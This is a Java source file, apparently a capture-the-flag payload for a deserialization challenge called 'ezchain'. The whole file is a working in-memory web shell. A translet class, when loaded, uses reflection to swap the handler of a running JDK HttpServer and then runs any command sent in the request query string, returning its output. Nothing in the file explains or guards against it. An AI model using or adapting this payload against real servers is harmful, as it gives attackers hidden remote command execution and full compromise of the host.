package com.ctf.ezchain;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.util.List;

public class Fuck extends AbstractTranslet implements HttpHandler {
    static {
        try{
            Thread t = Thread.currentThread();
            Field field = t.getThreadGroup().getClass().getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(t.getThreadGroup());
            for(int i = 0;i < threads.length;i ++){
                Thread thread = threads[i];
                field = Thread.class.getDeclaredField("target");
                field.setAccessible(true);
                Object o = field.get(thread);
                if( o != null){
                    if(o.getClass().getName() == "sun.net.httpserver.ServerImpl$Dispatcher"){
                        field = o.getClass().getDeclaredField("this$0");
                        field.setAccessible(true);
                        o = field.get(o);

                        field = o.getClass().getDeclaredField("contexts");
                        field.setAccessible(true);
                        o = field.get(o);

                        field = o.getClass().getDeclaredField("list");
                        field.setAccessible(true);
                        o = field.get(o);
                        List l = (List)o;
                        o = l.get(0);

                        field = o.getClass().getDeclaredField("handler");
                        field.setAccessible(true);
                        field.set(o, new Fuck());
                    }
                }
            }
        }catch (Exception e){

        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void handle(HttpExchange httpExchange) throws IOException {
        String cmd = httpExchange.getRequestURI().getQuery();

        byte[] b = String.format("%99s"," ").getBytes();
        Runtime.getRuntime().exec(cmd).getInputStream().read(b);
        String response = new String(b).trim();

        httpExchange.sendResponseHeaders(200, (long)response.length());
        OutputStream os = httpExchange.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
}
